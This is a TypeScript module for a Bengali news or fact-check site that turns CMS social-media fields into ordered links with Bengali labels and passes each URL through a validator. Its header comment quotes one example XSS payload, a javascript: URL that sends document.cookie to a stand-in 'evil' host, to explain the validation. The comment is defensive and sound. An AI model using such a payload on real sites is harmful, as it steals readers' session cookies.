/**
 * Official social accounts — one source of truth for the header, the mobile
 * drawer and the footer.
 *
 * ## Why this is a module and not three `Object.entries()` loops
 *
 * The header already iterated the CMS `social` group directly, which produced two
 * defects that only a Bengali reader would notice:
 *
 *   1. **The label was the raw field name.** `{platform}` rendered the literal
 *      string `facebook` — lowercase English, in a Bengali-only UI. The footer
 *      simply had no social links at all, so the two surfaces could not even
 *      drift consistently: one showed the wrong thing, the other showed nothing.
 *   2. **The order was whatever key order the CMS happened to serialise.** A
 *      social row that reshuffles between builds looks broken.
 *
 * So the platform list, the Bengali labels and the display order live here, and
 * every surface renders the same result.
 *
 * ## ⚠️ The URL is validated, and that is a security control
 *
 * These values come from a CMS text field and go straight into an `href`. Astro
 * escapes the attribute, which stops it breaking out of the tag — but escaping
 * does **not** neutralise a scheme. An editor account (or anyone who reaches one)
 * could store `javascript:fetch('//evil/'+document.cookie)` and every reader who
 * clicked the footer's Facebook icon would run it, on our own origin.
 *
 * The check itself lives in `lib/url.ts` (`safeExternalUrl`) because the
 * fact-check sources need exactly the same rule — one implementation, one place
 * to get it right.
 */
import { safeExternalUrl } from './url'

/** The platforms the CMS exposes, in the order they should be displayed. */
const PLATFORMS = [
  { key: 'facebook', label: 'ফেসবুক' },
  { key: 'youtube', label: 'ইউটিউব' },
  { key: 'instagram', label: 'ইনস্টাগ্রাম' },
  { key: 'twitter', label: 'এক্স (টুইটার)' },
] as const

export type SocialPlatform = (typeof PLATFORMS)[number]['key']

export interface SocialLink {
  platform: SocialPlatform
  /** Bengali label — never the raw field name. */
  label: string
  url: string
}

/**
 * Normalise the CMS `social` group into the ordered, renderable list.
 *
 * Absent, blank and invalid entries are dropped, so a surface can render
 * `socialLinks(...).length === 0` as "hide the whole block" — the same
 * self-hiding contract the interactive islands use.
 */
export function socialLinks(social: unknown): SocialLink[] {
  if (!social || typeof social !== 'object') return []
  const record = social as Record<string, unknown>

  return PLATFORMS.flatMap(({ key, label }) => {
    const url = safeExternalUrl(record[key])
    return url ? [{ platform: key, label, url }] : []
  })
}
